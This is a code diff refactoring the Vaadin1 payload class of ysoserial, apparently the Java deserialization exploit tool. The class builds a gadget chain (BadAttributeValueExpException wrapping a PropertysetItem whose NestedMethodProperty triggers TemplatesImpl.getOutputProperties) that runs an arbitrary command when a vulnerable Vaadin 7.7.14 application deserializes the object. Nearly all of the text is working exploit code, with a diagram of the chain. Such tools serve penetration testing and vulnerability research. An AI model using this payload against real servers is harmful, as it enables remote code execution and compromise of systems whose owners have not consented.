@@ -16,8 +16,7 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies ( { "com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14" })
 @PayloadTest ( precondition = "isApplicableJavaVersion")
 @Authors({ Authors.KULLRICH })
-public class Vaadin1 implements ObjectPayload<Object>
-{
+public class Vaadin1 extends ParameterizedTransletObjectPayload<Object> {
 //  +-------------------------------------------------+
 //  |                                                 |
 //  |  BadAttributeValueExpException                  |
@@ -55,19 +54,17 @@ public class Vaadin1 implements ObjectPayload<Object>
 //                |  TemplatesImpl.getOutputProperties()           |
 //                |                                                |
 //                +------------------------------------------------+
-    
+
     @Override
-    public Object getObject (String command) throws Exception
-    {
-        Object templ = Gadgets.createTemplatesImpl (command);
-        PropertysetItem pItem = new PropertysetItem ();        
-        
-        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object> (templ, "outputProperties");
+    protected Object getObject(Object templates) throws Exception {
+        PropertysetItem pItem = new PropertysetItem ();
+
+        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object> (templates, "outputProperties");
         pItem.addItemProperty ("outputProperties", nmprop);
-        
+
         BadAttributeValueExpException b = new BadAttributeValueExpException ("");
         Reflections.setFieldValue (b, "val", pItem);
-        
+
         return b;
     }
 
